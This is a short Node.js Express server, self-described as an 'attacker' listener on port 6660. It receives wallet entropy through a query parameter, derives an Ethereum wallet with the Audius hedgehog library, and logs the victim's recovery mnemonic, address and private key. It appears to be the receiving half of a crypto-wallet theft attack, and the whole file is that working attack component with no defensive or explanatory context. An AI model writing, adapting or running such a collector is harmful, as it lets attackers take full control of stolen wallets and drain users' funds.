const express = require('express')
const app = express()
app.use(require('cors')())
const { Authentication } = require('@audius/hedgehog')
const util = require('@netgum/utils')
const bip39 = require('bip39')
const port = 6660

app.get('/', async (req, res) => {
  const entropy = req.query.e
  const wallet = Authentication.generateWalletFromEntropy(entropy, `m/44'/60'/0'/0/0`)
  const mnemonic = (await bip39.entropyToMnemonic(entropy))
  const address = util.privateKeyToAddress(wallet._privKey)
  const privateKey = wallet._privKey.toString('hex')

  console.log('mnemonic:', mnemonic)
  console.log('address:', address)
  console.log('privateKey:', privateKey)

  res.sendStatus(200)
})

app.listen(port, () => {
  console.log(`attacker listening on port ${port}!`)
})

